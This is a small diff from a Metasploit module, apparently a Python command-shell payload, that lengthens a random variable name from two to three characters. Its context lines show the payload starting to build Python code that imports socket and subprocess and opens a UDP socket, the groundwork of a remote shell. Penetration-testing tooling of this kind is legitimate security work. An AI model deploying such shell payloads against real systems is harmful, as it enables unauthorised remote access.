@@ -46,7 +46,7 @@ module MetasploitModule
   #
   def command_string
     cmd = ''
-    dead = Rex::Text.rand_text_alpha(2)
+    dead = Rex::Text.rand_text_alpha(3)
     # Set up the socket
     cmd << "import socket,subprocess\n"
     cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n"
